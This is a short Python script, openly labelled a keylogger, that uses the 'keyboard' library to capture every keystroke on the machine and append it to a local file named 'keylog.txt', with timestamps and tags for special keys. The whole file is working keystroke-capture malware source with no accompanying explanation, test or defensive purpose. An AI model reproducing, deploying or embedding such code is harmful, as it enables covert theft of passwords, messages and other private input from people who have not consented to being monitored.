import keyboard
import time

log_file = "keylog.txt"
start_time = time.strftime("%Y-%m-%d %H:%M:%S")

with open(log_file, "w") as f:
    f.write("Keylogger started at " + start_time + "\n")

def on_key_press(event):
    with open(log_file, "a") as f:
        if event.name == "space":
            f.write(" ")
        elif event.name == "enter":
            f.write("\n")
        elif event.name == "backspace":
            f.write("[Backspace]")
        elif event.name == "tab":
            f.write("[Tab]")
        elif event.name == "shift":
            f.write("[Shift]")
        elif event.name == "ctrl":
            f.write("[Ctrl]")
        elif event.name == "alt":
            f.write("[Alt]")
        else:
            f.write(event.name)

def on_key_release(event):
    if event.name == "esc":
        with open(log_file, "a") as f:
            f.write("Keylogger stopped at " + time.strftime("%Y-%m-%d %H:%M:%S") + "\n")
        return False

keyboard.on_press(on_key_press)
keyboard.on_release(on_key_release)
keyboard.wait()
